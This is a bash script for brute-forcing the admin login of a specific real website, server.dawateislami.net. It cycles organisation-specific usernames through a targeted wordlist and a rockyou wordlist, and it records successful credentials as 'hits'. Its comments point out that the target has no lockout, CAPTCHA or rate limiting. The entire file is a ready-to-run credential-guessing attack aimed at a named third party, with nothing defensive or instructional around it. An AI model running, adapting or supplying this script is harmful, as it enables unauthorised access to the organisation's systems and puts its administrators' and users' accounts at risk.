#!/bin/bash
# Spring Boot Admin Brute Force
# Target: server.dawateislami.net/commonadmin/login
# No lockout, no CAPTCHA, no rate limiting

TARGET="https://server.dawateislami.net/commonadmin/login"
RESULTS_FILE="results.txt"
LOG_FILE="bruteforce.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

check_login() {
    local user=$1
    local pass=$2
    local resp
    resp=$(curl -sk -X POST "$TARGET" \
        -d "username=${user}&password=${pass}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --connect-timeout 5 \
        --max-time 10 2>/dev/null)
    local code=$(echo "$resp" | grep -c "Invalid\|incorrect\|failed\|error\|Unauthorized" || true)
    local size=${#resp}
    if [ "$code" -eq 0 ] && [ "$size" -gt 1000 ]; then
        return 0
    fi
    return 1
}

USERS=("admin" "root" "administrator" "dawat" "dawateislami" "madina" "mufti" "superadmin" "sysadmin" "webmaster" "operator" "manager" "user" "test" "guest")

log "=== Spring Boot Admin Brute Force ==="
log "Target: $TARGET"
log "Users: ${USERS[*]}"

TOTAL=0
FOUND=0

for wordlist in targeted.txt rockyou_filtered.txt; do
    if [ ! -f "$wordlist" ]; then
        log "Skipping $wordlist (not found)"
        continue
    fi

    COUNT=$(wc -l < "$wordlist")
    log "=== Processing $wordlist ($COUNT passwords) ==="

    while IFS= read -r pass; do
        [ -z "$pass" ] && continue
        for user in "${USERS[@]}"; do
            TOTAL=$((TOTAL + 1))
            if check_login "$user" "$pass"; then
                log "*** HIT: ${user}:${pass} ***"
                echo "SERVER HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                FOUND=1
                break 2
            fi
            sleep 0.1
        done
        if [ $((TOTAL % 500)) -eq 0 ]; then
            log "Tested $TOTAL attempts..."
        fi
    done < "$wordlist"
done

log "=== Server Brute Force Complete ==="
log "Total attempts: $TOTAL"
if [ $FOUND -eq 1 ]; then
    log "RESULT: PASSWORD FOUND"
else
    log "RESULT: No password found"
fi
